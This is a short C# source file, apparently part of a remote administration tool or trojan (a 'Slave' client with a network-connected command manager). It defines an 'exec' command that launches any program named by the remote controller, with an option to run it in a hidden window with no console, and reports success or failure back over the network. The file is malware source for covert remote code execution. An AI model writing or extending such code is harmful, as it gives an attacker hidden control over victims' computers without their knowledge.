using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Slave.Commands
{
    internal class Execute : ICommand
    {
        public string name { get; set; } = "exec";

        public void Process(List<string> args)
        {
            var startInfo = new ProcessStartInfo(args[0]);
            if (args.Count > 1)
            {
                if (args.Contains("hidden"))
                {
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                }

                if (args.Count == 3)
                {
                    startInfo.Arguments = args[1];
                }
            }

            try
            {
                System.Diagnostics.Process.Start(startInfo);
                SlaveCommandsManager.networkManager.WriteLine("OK");
            }
            catch (Exception)
            {
                SlaveCommandsManager.networkManager.WriteLine("KO");
            }
        }
    }
}
